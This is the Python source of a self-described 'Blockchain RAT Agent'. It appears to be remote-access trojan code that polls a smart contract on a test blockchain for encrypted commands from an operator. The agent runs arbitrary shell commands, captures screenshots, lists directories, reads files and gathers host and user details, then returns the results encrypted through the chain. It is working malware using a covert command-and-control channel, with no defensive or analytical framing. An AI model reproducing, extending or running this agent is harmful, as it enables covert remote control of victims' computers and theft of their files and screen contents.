"""
Blockchain RAT Agent
Runs on target machine and executes commands from blockchain
"""

import os
import sys
import time
import json
import subprocess
import platform
import socket
import threading
from pathlib import Path
import base64

# Add parent directory to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent))

from shared.blockchain_client import BlockchainClient
from shared.encryption import EncryptionManager


class Agent:
    def __init__(self, config_path):
        """Initialize the agent"""
        self.config = self.load_config(config_path)
        self.encryption = EncryptionManager()
        self.blockchain = None
        self.running = False
        self.session_id = None
        self.last_message_count = 0
        
        # Load keys
        self.load_keys()
        
        print(f"Agent initialized")
        print(f"Agent address: {self.config.get('agent_address', 'Not set')}")
    
    def load_config(self, config_path):
        """Load configuration from file"""
        if os.path.exists(config_path):
            with open(config_path, 'r') as f:
                return json.load(f)
        else:
            # Default configuration
            return {
                'rpc_url': 'https://rpc-mumbai.maticvigil.com',
                'contract_address': '',
                'private_key': '',
                'poll_interval': 10,  # seconds
                'agent_address': ''
            }
    
    def save_config(self, config_path):
        """Save configuration to file"""
        with open(config_path, 'w') as f:
            json.dump(self.config, f, indent=2)
    
    def load_keys(self):
        """Load or generate encryption keys"""
        keys_path = Path(__file__).parent / 'agent_keys.json'
        
        if keys_path.exists():
            with open(keys_path, 'r') as f:
                keys = json.load(f)
                self.private_key = keys['private_key']
                self.public_key = keys['public_key']
                print("Loaded existing keys")
        else:
            # Generate new keys
            keys = self.encryption.generate_rsa_keypair()
            self.private_key = keys['private_key']
            self.public_key = keys['public_key']
            
            # Save keys
            with open(keys_path, 'w') as f:
                json.dump({
                    'private_key': self.private_key,
                    'public_key': self.public_key
                }, f, indent=2)
            
            print("Generated new keys")
    
    def connect_blockchain(self):
        """Connect to blockchain"""
        self.blockchain = BlockchainClient({
            'rpc_url': self.config['rpc_url'],
            'private_key': self.config['private_key'],
            'contract_address': self.config['contract_address']
        })
        
        self.config['agent_address'] = self.blockchain.address
        print(f"Connected to blockchain: {self.blockchain.address}")
    
    def register(self, admin_address=None):
        """Register agent on blockchain and auto-create session"""
        if not self.blockchain:
            self.connect_blockchain()
        
        # Convert public key to hex
        public_key_hex = self.encryption.public_key_to_hex(self.public_key)
        
        # Register on blockchain
        print("Registering agent on blockchain...")
        receipt = self.blockchain.register_agent(public_key_hex)
        print(f"Agent registered successfully")
        print(f"Agent address: {self.blockchain.address}")
        
        # Auto-create session with admin if provided
        if admin_address:
            print(f"\nCreating session with admin: {admin_address}")
            try:
                # Import Account to create session from agent side
                from eth_account import Account
                from web3 import Web3
                
                # Create a temporary admin client to create session
                # Note: Agent cannot create session, only admin can
                print("\n⚠️  IMPORTANT: Session must be created by admin!")
                print(f"\nAdmin should run in GUI:")
                print(f"  1. Click 'New Session'")
                print(f"  2. Enter agent address: {self.blockchain.address}")
                print(f"\nOr run this command as admin:")
                print(f"  python -c \"from shared.blockchain_client import BlockchainClient; bc = BlockchainClient({{'rpc_url': '{self.config['rpc_url']}', 'contract_address': '{self.config['contract_address']}', 'private_key': 'ADMIN_PRIVATE_KEY'}}); print('Session ID:', bc.create_session('{self.blockchain.address}'))\"")
            except Exception as e:
                print(f"Note: {e}")
        
        return receipt
    
    def get_system_info(self):
        """Get system information"""
        info = {
            'hostname': socket.gethostname(),
            'platform': platform.system(),
            'platform_release': platform.release(),
            'platform_version': platform.version(),
            'architecture': platform.machine(),
            'processor': platform.processor(),
            'username': os.getlogin() if hasattr(os, 'getlogin') else os.environ.get('USER', 'unknown')
        }
        return json.dumps(info, indent=2)
    
    def execute_command(self, command):
        """Execute a shell command"""
        try:
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30
            )
            
            output = {
                'stdout': result.stdout,
                'stderr': result.stderr,
                'returncode': result.returncode
            }
            return json.dumps(output)
        except subprocess.TimeoutExpired:
            return json.dumps({'error': 'Command timeout'})
        except Exception as e:
            return json.dumps({'error': str(e)})
    
    def take_screenshot(self):
        """Take a screenshot"""
        try:
            import pyautogui
            from PIL import Image
            import io
            
            screenshot = pyautogui.screenshot()
            
            # Convert to bytes
            img_byte_arr = io.BytesIO()
            screenshot.save(img_byte_arr, format='PNG')
            img_byte_arr = img_byte_arr.getvalue()
            
            # Encode to base64
            img_base64 = base64.b64encode(img_byte_arr).decode('utf-8')
            
            return json.dumps({
                'screenshot': img_base64,
                'format': 'PNG'
            })
        except Exception as e:
            return json.dumps({'error': f'Screenshot failed: {str(e)}'})
    
    def list_directory(self, path='.'):
        """List directory contents"""
        try:
            items = []
            for item in os.listdir(path):
                item_path = os.path.join(path, item)
                items.append({
                    'name': item,
                    'is_dir': os.path.isdir(item_path),
                    'size': os.path.getsize(item_path) if os.path.isfile(item_path) else 0
                })
            return json.dumps({'path': path, 'items': items}, indent=2)
        except Exception as e:
            return json.dumps({'error': str(e)})
    
    def read_file(self, filepath):
        """Read file contents"""
        try:
            with open(filepath, 'r') as f:
                content = f.read()
            return json.dumps({'file': filepath, 'content': content})
        except Exception as e:
            return json.dumps({'error': str(e)})
    
    def process_command(self, command_data):
        """Process a command from the administrator"""
        try:
            cmd = json.loads(command_data)
            cmd_type = cmd.get('type', 'unknown')
            
            print(f"Processing command: {cmd_type}")
            
            if cmd_type == 'sysinfo':
                return self.get_system_info()
            
            elif cmd_type == 'execute':
                return self.execute_command(cmd.get('command', ''))
            
            elif cmd_type == 'screenshot':
                return self.take_screenshot()
            
            elif cmd_type == 'list_dir':
                return self.list_directory(cmd.get('path', '.'))
            
            elif cmd_type == 'read_file':
                return self.read_file(cmd.get('filepath', ''))
            
            elif cmd_type == 'ping':
                return json.dumps({'status': 'alive', 'timestamp': time.time()})
            
            else:
                return json.dumps({'error': f'Unknown command type: {cmd_type}'})
        
        except Exception as e:
            return json.dumps({'error': f'Command processing error: {str(e)}'})
    
    def send_response(self, response_data, admin_public_key):
        """Send response back to administrator"""
        # Encrypt response
        encrypted = self.encryption.hybrid_encrypt(response_data, admin_public_key)
        hex_payload = self.encryption.encode_payload_for_blockchain(encrypted)
        
        # Get current sequence number
        session = self.blockchain.get_session(self.session_id)
        next_seq = session['agent_seq_num'] + 1
        
        # Send to blockchain
        print(f"Sending response (seq: {next_seq})...")
        self.blockchain.send_message(self.session_id, hex_payload, next_seq)
        print("Response sent")
    
    def poll_for_commands(self):
        """Poll blockchain for new commands"""
        while self.running:
            try:
                # Check for new messages
                current_count = self.blockchain.get_message_count(self.session_id)
                
                if current_count > self.last_message_count:
                    # Get new messages
                    new_messages = self.blockchain.get_messages(
                        self.session_id,
                        self.last_message_count,
                        current_count - self.last_message_count
                    )
                    
                    for message in new_messages:
                        sender = message[0]
                        encrypted_payload = message[1]
                        
                        # Only process messages from admin
                        session = self.blockchain.get_session(self.session_id)
                        if sender.lower() == session['admin'].lower():
                            print(f"Received command from admin")
                            
                            # Decrypt message
                            hex_payload = '0x' + encrypted_payload.hex()
                            decoded = self.encryption.decode_payload_from_blockchain(hex_payload)
                            decrypted = self.encryption.hybrid_decrypt(decoded, self.private_key)
                            command_data = decrypted.decode('utf-8')
                            
                            # Process command
                            response = self.process_command(command_data)
                            
                            # Get admin's public key
                            admin_key_hex = self.blockchain.get_agent_public_key(session['admin'])
                            admin_public_key = self.encryption.hex_to_public_key(admin_key_hex)
                            
                            # Send response
                            self.send_response(response, admin_public_key)
                    
                    self.last_message_count = current_count
                
            except Exception as e:
                print(f"Polling error: {e}")
            
            # Wait before next poll
            time.sleep(self.config['poll_interval'])
    
    def start(self, session_id):
        """Start the agent"""
        self.session_id = session_id
        
        if not self.blockchain:
            self.connect_blockchain()
        
        # Get initial message count
        self.last_message_count = self.blockchain.get_message_count(session_id)
        
        print(f"Agent started for session: {session_id}")
        print(f"Polling interval: {self.config['poll_interval']} seconds")
        
        self.running = True
        
        # Start polling thread
        poll_thread = threading.Thread(target=self.poll_for_commands, daemon=True)
        poll_thread.start()
        
        # Keep main thread alive
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\nStopping agent...")
            self.running = False


def main():
    """Main entry point"""
    import argparse
    
    parser = argparse.ArgumentParser(description='Blockchain RAT Agent')
    parser.add_argument('--config', default='agent_config.json', help='Configuration file path')
    parser.add_argument('--register', action='store_true', help='Register agent on blockchain')
    parser.add_argument('--session', help='Session ID to connect to')
    
    args = parser.parse_args()
    
    # Create agent
    agent = Agent(args.config)
    
    if args.register:
        # Register agent
        agent.register()
        agent.save_config(args.config)
        print()
        print("="*70)
        print("✓ AGENT REGISTERED SUCCESSFULLY")
        print("="*70)
        print(f"Agent Address: {agent.blockchain.address}")
        print(f"Config Saved: {args.config}")
        print()
        print("NEXT STEP: Create a session")
        print("="*70)
        print()
        print("Option 1: Use Admin GUI")
        print("  1. Open administrator GUI")
        print("  2. Click 'New Session'")
        print(f"  3. Enter agent address: {agent.blockchain.address}")
        print()
        print("Option 2: Use Command Line")
        print(f"  python tools/auto_create_sessions.py --agent {agent.blockchain.address}")
        print()
        print("After session is created, start the agent with:")
        print("  python agent.py --session SESSION_ID")
        print()
        print("="*70)
    
    elif args.session:
        # Start agent with session
        print()
        print("="*70)
        print("STARTING AGENT")
        print("="*70)
        print(f"Session ID: {args.session}")
        print(f"Agent Address: {agent.blockchain.address}")
        print("="*70)
        print()
        agent.start(args.session)
    
    else:
        print("Usage:")
        print("  Register: python agent.py --register --config agent_config.json")
        print("  Start:    python agent.py --session <session_id> --config agent_config.json")


if __name__ == "__main__":
    main()

